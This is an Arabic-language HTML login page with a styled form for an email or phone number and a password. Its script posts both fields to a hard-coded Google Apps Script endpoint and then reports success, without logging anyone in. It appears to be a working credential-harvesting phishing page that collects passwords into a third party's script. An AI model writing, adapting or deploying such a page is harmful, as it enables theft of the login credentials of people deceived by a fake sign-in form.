<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>تسجيل الدخول</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap');

    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(to bottom, #1f1c2c, #928dab);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    h2 {
      font-size: 26px;
      margin-bottom: 20px;
    }

    form {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
      width: 300px;
      backdrop-filter: blur(10px);
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      background-color: #f2f2f2;
      font-size: 14px;
      color: #333;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #ff4081;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #e91e63;
    }

    #response {
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <h2>تسجيل الدخول</h2>
  <form id="loginForm">
    <label>البريد الإلكتروني أو رقم الهاتف:</label>
    <input type="text" name="email" required placeholder="example@gmail.com" />

    <label>كلمة المرور:</label>
    <input type="password" name="password" required placeholder="********" />

    <button type="submit">إرسال</button>
  </form>

  <p id="response"></p>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbxxuGvzzATtk3zhQRt-gWH9Nfpnva18bgeI_QVpP82ywknknHYSEaK4AzFKo6_0wKGSnA/exec";

    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const form = this;
      const formData = new FormData(form);

      if (!form.email.value || !form.password.value) {
        document.getElementById("response").innerText = "⚠️ الرجاء تعبئة جميع الحقول.";
        return;
      }

      fetch(scriptURL, {
        method: "POST",
        body: formData,
      })
        .then(response => response.text())
        .then(result => {
          document.getElementById("response").innerText = "✅ تم إرسال البيانات بنجاح!";
          form.reset();
        })
        .catch(error => {
          document.getElementById("response").innerText = "❌ حدث خطأ أثناء الإرسال.";
          console.error("Error!", error.message);
        });
    });
  </script>

</body>
</html>
